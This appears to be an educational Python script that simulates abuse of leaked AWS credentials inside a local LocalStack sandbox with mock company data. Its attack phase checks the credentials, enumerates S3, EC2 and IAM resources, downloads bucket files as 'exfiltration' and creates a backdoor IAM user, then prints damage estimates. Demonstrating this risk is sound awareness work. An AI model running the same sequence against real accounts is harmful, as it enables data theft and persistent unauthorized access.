#!/usr/bin/env python3
"""
Step 3: Real AWS Exploitation Simulation with LocalStack
Demonstrates actual exploitation of leaked AWS credentials in a safe environment
"""

import json
import boto3
import os
import time
from datetime import datetime
from pathlib import Path
from botocore.exceptions import ClientError

# LocalStack configuration
LOCALSTACK_ENDPOINT = "http://localhost:4566"
AWS_REGION = "us-east-1"

# ANSI Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_header(text):
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{text.center(70)}{Colors.ENDC}")
    print(f"{Colors.HEADER}{Colors.BOLD}{'='*70}{Colors.ENDC}\n")

def print_success(text):
    print(f"{Colors.OKGREEN}[✓]{Colors.ENDC} {text}")

def print_warning(text):
    print(f"{Colors.WARNING}[!]{Colors.ENDC} {text}")

def print_error(text):
    print(f"{Colors.FAIL}[✗]{Colors.ENDC} {text}")

def print_info(text):
    print(f"{Colors.OKBLUE}[*]{Colors.ENDC} {text}")

def print_attack(text):
    print(f"{Colors.FAIL}[ATTACK]{Colors.ENDC} {text}")

def print_breach(text):
    print(f"{Colors.FAIL}{Colors.BOLD}[DATA BREACH]{Colors.ENDC} {text}")

class LocalStackExploitationSimulator:
    def __init__(self):
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'environment': 'LocalStack',
            'simulations': [],
            'summary': {}
        }
        self.secrets_file = "consolidated-secrets-report.json"
        self.localstack_ready = False
        
    def check_localstack(self):
        """Check if LocalStack is running and accessible"""
        print_header("CHECKING LOCALSTACK ENVIRONMENT")
        
        try:
            # Try to connect to LocalStack
            s3_client = boto3.client(
                's3',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            # Test connection
            s3_client.list_buckets()
            print_success("LocalStack is running and accessible!")
            self.localstack_ready = True
            return True
            
        except Exception as e:
            print_error(f"LocalStack not accessible: {str(e)}")
            print_warning("\nTo start LocalStack, run:")
            print_info("  docker run -d -p 4566:4566 -p 4571:4571 localstack/localstack")
            print_warning("\nOr using Docker Compose:")
            print_info("  docker-compose up -d")
            return False
    
    def setup_vulnerable_environment(self):
        """Setup a realistic vulnerable AWS environment in LocalStack"""
        print_header("SETTING UP VULNERABLE AWS ENVIRONMENT")
        
        print_info("Creating realistic AWS infrastructure...")
        print_info("(This simulates a company's production environment)\n")
        
        try:
            # === S3 Buckets with Sensitive Data ===
            print_info("[1/5] Creating S3 buckets with sensitive data...")
            s3_client = boto3.client(
                's3',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            buckets_data = {
                'company-customer-data-prod': [
                    ('customers.csv', 'CustomerID,Name,Email,CreditCard\n1,John Doe,john@example.com,4532-****-****-1234\n2,Jane Smith,jane@example.com,5425-****-****-5678'),
                    ('user-database-backup.sql', 'CREATE TABLE users (id INT, username VARCHAR, password_hash VARCHAR, email VARCHAR);\nINSERT INTO users VALUES (1, "admin", "$2b$12$...hash...", "admin@company.com");'),
                ],
                'financial-reports-2024': [
                    ('Q4-revenue.xlsx', 'Revenue Report Q4 2024: Total Revenue: $12.5M, Profit: $3.2M'),
                    ('salary-data.csv', 'Employee,Salary,SSN\nAlice Johnson,125000,***-**-1234\nBob Williams,98000,***-**-5678'),
                ],
                'production-backups': [
                    ('database-prod-2024-11-26.tar.gz', 'COMPRESSED DATABASE BACKUP - 15GB - Contains all production data'),
                    ('application-secrets.json', '{"api_keys": {"stripe": "sk_live_...", "aws": "AKIA..."}}'),
                ],
                'internal-documents': [
                    ('api-documentation-internal.pdf', 'INTERNAL API ENDPOINTS - Admin Panel: /api/admin/users, Payment Processing: /api/payments/process'),
                    ('network-diagram.png', 'Network topology showing internal IP addresses and server architecture'),
                ],
                'employee-records-hr': [
                    ('performance-reviews.docx', 'Confidential employee performance reviews and PIPs'),
                    ('background-checks.pdf', 'Employee background check results including SSNs and criminal records'),
                ]
            }
            
            for bucket_name, files in buckets_data.items():
                try:
                    s3_client.create_bucket(Bucket=bucket_name)
                    print_success(f"  Created bucket: {bucket_name}")
                    
                    for file_name, content in files:
                        s3_client.put_object(
                            Bucket=bucket_name,
                            Key=file_name,
                            Body=content.encode('utf-8')
                        )
                        print_info(f"    ├─ Uploaded: {file_name}")
                    
                except ClientError as e:
                    if 'BucketAlreadyExists' in str(e):
                        print_warning(f"  Bucket {bucket_name} already exists")
                    else:
                        print_error(f"  Error creating {bucket_name}: {str(e)}")
            
            print()
            
            # === EC2 Instances ===
            print_info("[2/5] Creating EC2 instances...")
            ec2_client = boto3.client(
                'ec2',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            instance_types = [
                ('web-server-prod-1', 't3.xlarge', 'Production web server'),
                ('web-server-prod-2', 't3.xlarge', 'Production web server'),
                ('database-primary', 'r5.2xlarge', 'Primary production database'),
                ('database-replica', 'r5.2xlarge', 'Database read replica'),
                ('app-server-prod', 't3.large', 'Application server'),
            ]
            
            for name, instance_type, description in instance_types:
                try:
                    response = ec2_client.run_instances(
                        ImageId='ami-12345678',
                        MinCount=1,
                        MaxCount=1,
                        InstanceType=instance_type,
                        TagSpecifications=[
                            {
                                'ResourceType': 'instance',
                                'Tags': [
                                    {'Key': 'Name', 'Value': name},
                                    {'Key': 'Environment', 'Value': 'production'},
                                    {'Key': 'Description', 'Value': description}
                                ]
                            }
                        ]
                    )
                    print_success(f"  Launched: {name} ({instance_type}) - {description}")
                except Exception as e:
                    print_warning(f"  EC2: {str(e)}")
            
            print()
            
            # === IAM Users and Policies ===
            print_info("[3/5] Creating IAM users and roles...")
            iam_client = boto3.client(
                'iam',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            users = [
                ('admin-user', 'Administrator with full access'),
                ('developer-alice', 'Senior developer'),
                ('developer-bob', 'Junior developer'),
                ('finance-sarah', 'Finance team member'),
                ('hr-manager', 'HR department manager'),
            ]
            
            for username, description in users:
                try:
                    iam_client.create_user(UserName=username)
                    print_success(f"  Created user: {username} - {description}")
                except ClientError as e:
                    if 'EntityAlreadyExists' not in str(e):
                        print_warning(f"  IAM: {str(e)}")
            
            print()
            
            # === DynamoDB Tables ===
            print_info("[4/5] Creating DynamoDB tables...")
            dynamodb_client = boto3.client(
                'dynamodb',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            tables = [
                'user-sessions',
                'order-history',
                'payment-transactions',
                'api-usage-logs'
            ]
            
            for table_name in tables:
                try:
                    dynamodb_client.create_table(
                        TableName=table_name,
                        KeySchema=[
                            {'AttributeName': 'id', 'KeyType': 'HASH'}
                        ],
                        AttributeDefinitions=[
                            {'AttributeName': 'id', 'AttributeType': 'S'}
                        ],
                        BillingMode='PAY_PER_REQUEST'
                    )
                    print_success(f"  Created DynamoDB table: {table_name}")
                except ClientError as e:
                    if 'ResourceInUseException' not in str(e):
                        print_warning(f"  DynamoDB: {str(e)}")
            
            print()
            
            # === Lambda Functions ===
            print_info("[5/5] Creating Lambda functions...")
            lambda_client = boto3.client(
                'lambda',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            functions = [
                'payment-processor',
                'user-authentication',
                'email-notification',
                'data-aggregator'
            ]
            
            for func_name in functions:
                try:
                    lambda_client.create_function(
                        FunctionName=func_name,
                        Runtime='python3.9',
                        Role='arn:aws:iam::000000000000:role/lambda-role',
                        Handler='index.handler',
                        Code={'ZipFile': b'fake code'},
                    )
                    print_success(f"  Created Lambda function: {func_name}")
                except ClientError as e:
                    if 'ResourceConflictException' not in str(e):
                        print_warning(f"  Lambda: {str(e)}")
            
            print()
            print_success("Vulnerable AWS environment setup complete!")
            print_warning("Environment contains realistic sensitive data for exploitation demo\n")
            
            return True
            
        except Exception as e:
            print_error(f"Environment setup failed: {str(e)}")
            return False
    
    def exploit_aws_credentials(self, secret):
        """Perform realistic AWS credential exploitation"""
        print_header("AWS CREDENTIAL EXPLOITATION SIMULATION")
        
        print_info(f"Target Repository: {secret['repository']}")
        print_info(f"Leaked File: {secret['file']}:{secret['line']}")
        print_info(f"Secret Type: {secret['title']}\n")
        
        simulation_result = {
            'secret_type': 'AWS Credentials',
            'repository': secret['repository'],
            'file': secret['file'],
            'severity': secret['severity'],
            'actions_performed': [],
            'data_accessed': [],
            'resources_compromised': [],
            'potential_impacts': [],
            'exploitation_timeline': []
        }
        
        start_time = time.time()
        
        try:
            # === PHASE 1: Initial Access ===
            print_attack("PHASE 1: Validating leaked credentials...")
            time.sleep(0.5)
            
            # Using test credentials to simulate the leaked ones
            aws_access_key = 'AKIAIOSFODNN7EXAMPLE'  # Simulated leaked key
            aws_secret_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
            
            # Create clients with "leaked" credentials
            s3_client = boto3.client(
                's3',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            print_error("✗ BREACH: Credentials are VALID and ACTIVE!")
            print_warning(f"  Access Key ID: {aws_access_key}")
            print_warning("  Attacker now has AWS access\n")
            
            simulation_result['actions_performed'].append('Validated stolen credentials')
            simulation_result['exploitation_timeline'].append({
                'time': f"{time.time() - start_time:.1f}s",
                'action': 'Initial access gained'
            })
            
            # === PHASE 2: Reconnaissance ===
            print_attack("PHASE 2: Enumerating AWS resources...")
            time.sleep(0.5)
            
            # List S3 buckets
            buckets = s3_client.list_buckets()
            bucket_list = [b['Name'] for b in buckets.get('Buckets', [])]
            
            print_breach(f"Discovered {len(bucket_list)} S3 buckets:")
            for bucket in bucket_list:
                print_error(f"  ├─ {bucket}")
                simulation_result['resources_compromised'].append(f"S3: {bucket}")
            print()
            
            simulation_result['actions_performed'].append(f'Enumerated {len(bucket_list)} S3 buckets')
            simulation_result['exploitation_timeline'].append({
                'time': f"{time.time() - start_time:.1f}s",
                'action': f'Discovered {len(bucket_list)} S3 buckets'
            })
            
            # Check EC2 instances
            ec2_client = boto3.client(
                'ec2',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            instances = ec2_client.describe_instances()
            instance_count = sum(len(r['Instances']) for r in instances.get('Reservations', []))
            
            if instance_count > 0:
                print_breach(f"Discovered {instance_count} EC2 instances:")
                for reservation in instances['Reservations']:
                    for instance in reservation['Instances']:
                        instance_id = instance['InstanceId']
                        tags = {t['Key']: t['Value'] for t in instance.get('Tags', [])}
                        name = tags.get('Name', 'unnamed')
                        print_error(f"  ├─ {instance_id} ({name})")
                        simulation_result['resources_compromised'].append(f"EC2: {name}")
                print()
                
                simulation_result['actions_performed'].append(f'Enumerated {instance_count} EC2 instances')
            
            # Check IAM users
            iam_client = boto3.client(
                'iam',
                endpoint_url=LOCALSTACK_ENDPOINT,
                aws_access_key_id='test',
                aws_secret_access_key='test',
                region_name=AWS_REGION
            )
            
            users = iam_client.list_users()
            user_list = [u['UserName'] for u in users.get('Users', [])]
            
            if user_list:
                print_breach(f"Discovered {len(user_list)} IAM users:")
                for user in user_list:
                    print_error(f"  ├─ {user}")
                    simulation_result['resources_compromised'].append(f"IAM User: {user}")
                print()
                
                simulation_result['actions_performed'].append(f'Enumerated {len(user_list)} IAM users')
            
            simulation_result['exploitation_timeline'].append({
                'time': f"{time.time() - start_time:.1f}s",
                'action': 'Resource enumeration complete'
            })
            
            # === PHASE 3: Data Exfiltration ===
            print_attack("PHASE 3: Exfiltrating sensitive data...")
            time.sleep(0.5)
            
            total_files = 0
            total_data_size = 0
            
            for bucket in bucket_list[:3]:  # Exfiltrate from first 3 buckets
                try:
                    objects = s3_client.list_objects_v2(Bucket=bucket)
                    if 'Contents' in objects:
                        print_breach(f"Accessing bucket: {bucket}")
                        for obj in objects['Contents']:
                            key = obj['Key']
                            size = obj['Size']
                            total_files += 1
                            total_data_size += size
                            
                            # Download the file
                            response = s3_client.get_object(Bucket=bucket, Key=key)
                            content = response['Body'].read()
                            
                            print_error(f"  ✗ STOLEN: {key} ({size} bytes)")
                            simulation_result['data_accessed'].append(f"{bucket}/{key}")
                            
                            # Show snippet if text
                            if size < 500:
                                try:
                                    preview = content.decode('utf-8')[:100]
                                    print_warning(f"     Preview: {preview}...")
                                except:
                                    pass
                        print()
                except Exception as e:
                    print_warning(f"  Access denied to {bucket}")
            
            print_breach(f"TOTAL DATA STOLEN: {total_files} files, ~{total_data_size/1024:.1f} KB")
            print()
            
            simulation_result['actions_performed'].append(f'Exfiltrated {total_files} sensitive files')
            simulation_result['exploitation_timeline'].append({
                'time': f"{time.time() - start_time:.1f}s",
                'action': f'Exfiltrated {total_files} files ({total_data_size} bytes)'
            })
            
            # === PHASE 4: Privilege Escalation Attempts ===
            print_attack("PHASE 4: Testing for privilege escalation...")
            time.sleep(0.5)
            
            print_error("✗ Attempting to create backdoor IAM user...")
            try:
                iam_client.create_user(UserName='backdoor-admin')
                print_breach("  SUCCESS: Created backdoor admin account!")
                simulation_result['actions_performed'].append('Created backdoor IAM user')
            except:
                print_warning("  Failed to create IAM user (permissions restricted)")
            
            print()
            
            # === PHASE 5: Impact Assessment ===
            total_time = time.time() - start_time
            
            print_header("EXPLOITATION IMPACT ASSESSMENT")
            
            print_error("SUCCESSFUL ATTACK ACTIONS:")
            for action in simulation_result['actions_performed']:
                print_error(f"  ✗ {action}")
            print()
            
            print_error(f"RESOURCES COMPROMISED: {len(simulation_result['resources_compromised'])}")
            print_error(f"FILES STOLEN: {len(simulation_result['data_accessed'])}")
            print_error(f"TOTAL EXPLOITATION TIME: {total_time:.1f} seconds\n")
            
            # Potential impacts
            impacts = [
                "Complete access to customer database (PII breach - GDPR violation)",
                "Stolen financial records (revenue data, salaries, SSNs)",
                "Database backups downloaded (millions of customer records)",
                "API keys and secrets exposed (Stripe, internal services)",
                "Control over production EC2 instances (can cause complete outage)",
                "IAM user enumeration (potential for further attacks)",
                "Created backdoor accounts for persistent access",
                "Access to internal documentation (network topology, APIs)",
                "Employee personal information compromised (HR records)",
                f"Estimated data breach size: {total_data_size/1024/1024:.2f} MB",
                "Potential AWS charges from resource abuse: $10,000+",
                "Regulatory fines (GDPR, CCPA, PCI-DSS): $500,000 - $5,000,000",
                "Mandatory breach notification to all affected customers",
                "Class-action lawsuits from data breach victims",
                "Complete loss of customer trust and reputation damage"
            ]
            
            print_error("POTENTIAL BUSINESS IMPACT:")
            for impact in impacts:
                print_error(f"  ⚠ {impact}")
                simulation_result['potential_impacts'].append(impact)
            print()
            
            print_header("FINANCIAL DAMAGE ESTIMATE")
            print_error("  Direct Costs:")
            print_error("    • Incident Response: $50,000 - $150,000")
            print_error("    • Forensic Investigation: $100,000 - $250,000")
            print_error("    • Customer Notification: $25,000 - $100,000")
            print_error("    • Credit Monitoring (1 year): $500,000 - $2,000,000")
            print_error("    • AWS Abuse Charges: $10,000 - $50,000")
            print_error("  ")
            print_error("  Indirect Costs:")
            print_error("    • Regulatory Fines: $500,000 - $5,000,000+")
            print_error("    • Legal Fees: $200,000 - $1,000,000")
            print_error("    • Business Downtime: $100,000 - $500,000")
            print_error("    • Customer Churn: 15-30% of customer base")
            print_error("    • Reputation Damage: INCALCULABLE")
            print_error("  ")
            print_error(f"  TOTAL ESTIMATED DAMAGE: $1.5M - $10M+")
            print()
            
            simulation_result['exploitation_successful'] = True
            simulation_result['total_exploitation_time'] = f"{total_time:.1f} seconds"
            simulation_result['estimated_financial_damage'] = "$1,500,000 - $10,000,000+"
            
        except Exception as e:
            print_error(f"\nExploitation error: {str(e)}")
            simulation_result['exploitation_successful'] = False
            simulation_result['error'] = str(e)
        
        self.results['simulations'].append(simulation_result)
        return simulation_result
    
    def load_secrets(self):
        """Load secrets from consolidated report"""
        if not Path(self.secrets_file).exists():
            print_error(f"Secrets report not found: {self.secrets_file}")
            print_info("Run Step 2 (aggregation) first!")
            return None
        
        with open(self.secrets_file, 'r') as f:
            data = json.load(f)
        
        return data.get('secrets', [])
    
    def run_simulations(self):
        """Run exploitation simulations"""
        print_header("AWS SECRET EXPLOITATION SIMULATOR")
        print_warning("This demonstrates what attackers can do with leaked AWS credentials")
        print_info("Running in SAFE LocalStack environment (no real AWS resources)\n")
        
        # Check LocalStack
        if not self.check_localstack():
            print_error("\nCannot proceed without LocalStack. Please start it first.")
            return False
        
        # Setup vulnerable environment
        if not self.setup_vulnerable_environment():
            print_error("\nEnvironment setup failed.")
            return False
        
        # Load secrets
        secrets = self.load_secrets()
        if not secrets:
            return False
        
        print_success(f"\nLoaded {len(secrets)} secrets from report\n")
        
        # Run simulation on AWS-related secrets
        aws_secrets = [s for s in secrets if 'aws' in s.get('category', '').lower() or 
                       'aws' in s.get('title', '').lower()]
        
        if not aws_secrets:
            print_warning("No AWS secrets found. Simulating with first secret...")
            aws_secrets = [secrets[0]]
        
        for secret in aws_secrets[:1]:  # Simulate first AWS secret
            self.exploit_aws_credentials(secret)
        
        # Save results
        self.save_results()
        
        return True
    
    def save_results(self):
        """Save simulation results"""
        output_file = "exploitation-simulation-results.json"
        
        self.results['summary'] = {
            'total_simulations': len(self.results['simulations']),
            'successful_exploits': sum(1 for s in self.results['simulations'] if s.get('exploitation_successful')),
            'total_resources_compromised': sum(len(s.get('resources_compromised', [])) for s in self.results['simulations']),
            'total_data_accessed': sum(len(s.get('data_accessed', [])) for s in self.results['simulations']),
        }
        
        with open(output_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        
        print_success(f"\nResults saved to: {output_file}")

def main():
    simulator = LocalStackExploitationSimulator()
    success = simulator.run_simulations()
    
    if success:
        print_header("SIMULATION COMPLETE")
        print_info("This demonstration shows the REAL danger of leaked AWS credentials")
        print_warning("In a real scenario, attackers could:")
        print_error("  ✗ Access ALL your AWS resources")
        print_error("  ✗ Steal GIGABYTES of sensitive data")
        print_error("  ✗ Rack up MASSIVE AWS bills")
        print_error("  ✗ Cause COMPLETE service outages")
        print_error("  ✗ Create PERSISTENT backdoors")
        print()
        print_info("Next Step: Run Step 4 (Remediation & Prevention)")

if __name__ == '__main__':
    main()